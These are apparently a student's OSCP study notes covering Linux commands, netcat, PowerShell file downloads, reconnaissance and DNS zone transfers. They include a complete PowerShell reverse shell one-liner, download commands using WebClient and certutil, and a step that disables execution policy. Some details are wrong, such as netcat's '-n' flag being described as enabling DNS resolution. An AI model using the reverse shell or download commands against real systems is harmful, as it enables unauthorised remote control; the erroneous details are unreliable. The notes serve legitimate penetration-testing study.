# OSCP Notes

The course first focuses on basic linux commands and navigation using command line.
I'll just put some important ones on here and then we'll move onto the pentesting section of this course because that is honestly the only thing I am excited about.

* With `ps` command you can see the current processes
* With `kill` command you can kill a pariticular process.
* With `wget` command you can download a file from a remote web browser
* With `curl` command you can download manipulate http requests and modify them on the go


# Customizing the bash enviornment 
*Alias* is a string we can define which can replace the command name. By doing 
```bash
alias lsa="ls -la"
```
We can define lsa as ls -la.

# Netcat

It can be run in two modes => client or server.

## Client Mode

we can connect to a tcp port by using client mode.

```bash
nc -n -v $(ip)
```
* -n tells the netcat to use the dns resolution
* -v tells the netcat to run in verbose mode

## Server Mode

```bash
nc -nvlp $(port)
```
This will open the listner.

```bash
nc -nv $(ip) $(port) 
```

It can also be used to transfer files, open reverse shell and much more.

# PowerShell
It maintains an execution policy which describes which powershell scipts can be run and which cannot be.
By default it is restricted.
You can unrestrict is by using the following the command

```ps1
Set-ExecutionPolicy Unrestricted
```
And you can check it by the following command

```ps1
Get-ExecutionPolicy
```
## Transfer file using powershell

* ```ps1
powershell -c "(new-object System.Net.WebClient).DownloadFile('$(source localtion)', '$(targetlocation)')"
```
* ```ps1
certutil -urlcache -f "$(source location)" $(filename)
```


# Powershell reverse Shell

```ps1
$client = New-Object System.Net.Sockets.TCPClient('$(ip)',$(port));$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```


# Passive Recon

## Some Baic commands
* `whois` tells info about a domain
* `nslookup` does a reverse lookup on a domain
* `hosts` command will tell you about the different types of web servers and their ip addresses.

# Active Recon

## Dns Enumeration

* ```bash
host $(website)
```
This commmand helps in finding the ip address of a domain and also helps in finding different types of webservers and their ips too.
you can specify the type of web server with the help of -t flag 

## DNS Zone Transfers

This is an amazing technique which will basically tranfer the whole zone file of domain onto anyserver if misconfigured by sysadmins.
We can find out the domain servers by
```bash
host -t ns $(domain)
```










